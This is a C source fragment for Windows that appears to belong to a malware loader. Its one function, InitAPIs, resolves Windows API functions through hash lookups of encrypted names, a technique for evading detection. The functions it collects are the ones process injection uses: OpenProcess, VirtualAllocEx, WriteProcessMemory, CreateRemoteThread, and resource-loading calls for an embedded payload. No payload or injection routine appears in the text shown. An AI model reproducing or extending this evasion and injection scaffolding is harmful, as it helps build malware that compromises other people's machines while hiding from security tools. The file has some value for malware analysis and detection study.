#pragma once
#include <stdio.h>
#include <windows.h>
#include "crypto.h"
#include "api.h"

void InitAPIs(APIs* api,BOOL debug) {
    api->pGetProcAddress = (customGetProcAddress)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_14,debug);
    api->pGetModuleHandleA = (customGetModuleHandleA)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_17,debug);

    HMODULE hKernel32 = api->pGetModuleHandleA(decryptedName);

    api->pGetLastError = (customGetLastError)api->pGetProcAddress(hKernel32, "GetLastError");
    api->pVirtualAlloc = (customVirtualAlloc)api->pGetProcAddress(hKernel32, "VirtualAlloc");
    api->pWriteProcessMemory = (customWriteProcessMemory)api->pGetProcAddress(hKernel32, "WriteProcessMemory");
    api->pOpenProcess = (customOpenProcess)api->pGetProcAddress(hKernel32, "OpenProcess");

    api->pCreateProcess = (customCreateProcess)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_5,debug);
    api->pGetModuleHandleEx = (customGetModuleHandleEx)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_6,debug);
    api->pFindResource = (customFindResource)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_7,debug);
    api->pLoadResource = (customLoadResource)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_8,debug);
    api->pLockResource = (customLockResource)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_9,debug);
    api->pSizeofResource = (customSizeofResource)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_10,debug);

    api->pCreateThread = (customCreateThread)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_0,debug);
    api->pVirtualAllocEx = (customVirtualAllocEx)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_2,debug);
    api->pCreateRemoteThread = (customCreateRemoteThread)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_1,debug);
    api->pCloseHandle = (customCloseHandle)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_4,debug);
    api->pVirtualFree = (customVirtualFree)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_12,debug);
    api->pVirtualFreeEx = (customVirtualFreeEx)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_13,debug);

    api->pCreateFileA = (customCreateFileA)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_15,debug);
    api->pReadFile = (customReadFile)getFunctionAddressByHash(decryptedName, g_ApiHashes._api_16,debug);
   
}
